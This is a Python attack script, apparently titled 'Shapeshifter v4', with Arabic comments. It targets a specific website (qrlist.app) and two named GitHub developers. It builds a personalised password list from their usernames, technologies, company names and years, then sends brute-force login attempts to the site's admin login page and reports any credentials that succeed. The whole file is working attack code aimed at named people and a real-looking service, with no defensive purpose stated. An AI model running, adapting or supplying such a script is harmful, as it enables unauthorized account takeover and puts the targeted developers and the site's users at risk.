#!/usr/bin/env python3
"""
🧠 Shapeshifter v4 - Psychological Attack
يحلل شخصية المطور ويتوقع كلمة المرور
"""
import requests, sys, json, os, re, random, time
from datetime import datetime
from urllib.parse import urlparse

class ShapeshifterV4:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.profile = {}  # ملف شخصي للمطور
        self.passwords = []
        self.session = requests.Session()
    
    def log(self, msg): print(f"[🧠] {msg}")
    
    def analyze_developer(self):
        """تحليل شخصية المطور"""
        self.log("🔍 تحليل المطور...")
        
        # Fernando Guzzo (fmguzzo) - GitHub
        # hodakl099 - GitHub
        
        # نمط من اسم المستخدم
        self.profile["github_users"] = ["fmguzzo", "hodakl099"]
        
        # نمط من التكنولوجيا
        self.profile["tech"] = ["laravel", "nuxt", "backpack", "cloudflare"]
        
        # نمط من الشركة
        self.profile["company"] = ["qrlist", "rikaz", "wp1"]
        
        # نمط من التاريخ (آخر تحديث للكود: 2022)
        self.profile["years"] = ["2022", "2023", "2024", "2025", "2026"]
        
        self.log(f"   👤 {self.profile['github_users']}")
        self.log(f"   🛠️ {self.profile['tech']}")
        self.log(f"   🏢 {self.profile['company']}")
    
    def generate_psychological_passwords(self):
        """توليد كلمات مرور بناءً على التحليل النفسي"""
        self.log("🧠 توليد كلمات مرور نفسية...")
        
        patterns = [
            # اسم المستخدم + سنة
            lambda u, y: f"{u}{y}",
            lambda u, y: f"{u}@{y}",
            lambda u, y: f"{u.capitalize()}{y}",
            # تكنولوجيا + سنة
            lambda t, y: f"{t}{y}",
            lambda t, y: f"{t.capitalize()}{y}",
            # شركة + سنة
            lambda c, y: f"{c}{y}",
            lambda c, y: f"{c.capitalize()}{y}",
            # اسم المستخدم + تكنولوجيا
            lambda u, t: f"{u}{t}",
            lambda u, t: f"{u}@{t}",
            # شركة + تكنولوجيا
            lambda c, t: f"{c}{t}",
        ]
        
        passwords = set()
        
        for user in self.profile["github_users"]:
            for year in self.profile["years"]:
                for pattern in patterns:
                    try:
                        passwords.add(pattern(user, year))
                    except:
                        pass
        
        for tech in self.profile["tech"]:
            for year in self.profile["years"]:
                passwords.add(f"{tech}{year}")
                passwords.add(f"{tech.capitalize()}{year}")
        
        for company in self.profile["company"]:
            for year in self.profile["years"]:
                passwords.add(f"{company}{year}")
                passwords.add(f"{company.capitalize()}{year}")
        
        # إضافة كلمات مرور شائعة للمطورين
        passwords.update(["admin", "password", "123456", "qwerty", "root", "test", "dev"])
        
        self.passwords = list(passwords)
        self.log(f"   📚 {len(self.passwords)} كلمة مرور نفسية")
    
    def attack(self):
        """هجوم نفسي"""
        self.log("⚔️ هجوم نفسي...")
        
        users = ["admin", "fmguzzo", "hodakl099", "info", "contact"]
        
        for user in users:
            for pwd in self.passwords[:30]:  # أول 30
                try:
                    r = self.session.post(f"{self.target}/admin/login",
                        data={"email":f"{user}@qrlist.app","password":pwd},
                        timeout=5, allow_redirects=False)
                    
                    if r.status_code == 302 and "login" not in r.headers.get("Location",""):
                        self.log(f"   🚨🚨🚨 {user}:{pwd}")
                        return user, pwd
                except:
                    pass
                time.sleep(0.2)
        
        return None, None
    
    def run(self):
        self.log(f"🧠 Shapeshifter v4: {self.target}")
        self.log("═" * 60)
        
        self.analyze_developer()
        self.generate_psychological_passwords()
        user, pwd = self.attack()
        
        if user:
            self.log(f"\n💣 اختراق نفسي! {user}:{pwd}")
        else:
            self.log(f"\n❌ فشل الهجوم النفسي")
        
        # حفظ
        os.makedirs("logs/shapeshifter", exist_ok=True)
        fname = f"logs/shapeshifter/v4_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"profile":self.profile,"passwords":self.passwords}, f, indent=2)
        self.log(f"📁 {fname}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    ShapeshifterV4(target).run()
